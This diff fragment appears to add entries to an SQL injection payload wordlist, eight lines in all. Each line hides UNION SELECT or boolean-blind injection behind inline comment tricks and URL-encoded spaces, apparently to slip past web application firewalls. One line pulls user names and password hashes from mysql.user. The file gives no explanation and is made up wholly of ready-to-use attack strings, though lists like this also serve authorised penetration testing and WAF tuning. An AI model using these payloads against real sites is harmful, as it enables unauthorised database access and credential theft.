@@ -1,0 +1,8 @@
+and/*8*/'s'=%20%20"s" and/**888***/(CHAR_LENGTH('')<> (select count(*) /*Fr.Om*/from 6))
+id=-1/*^^^^^*/UNION/*^^^^^*/select/*^^^^^*/user(),password ,3/*^^^^^*/from/*^^^^^*/mysql.user/*^^^^^*/limit/*^^^^^*/1
+id=-1%20/*p{x}*/UNION%20/*p{x}*/SELECT%20/*%20*/1,2,3
+id=-1%20/*(x}*/UNION/*(x}*/SELECT%201,2,3
+id=-1%20/*O9-0*/UNION/*O-0*/SELECT%201,2,3
+id=-1%20/*x,x*/UNION/*x,x*/SELECT%201,2,3
+id=-1%20/*x}x*/UNION/*x}x*/SELECT%201,2,3
+id=-1%20/*x{x*/UNION/*x{x*/SELECT%201,2,3
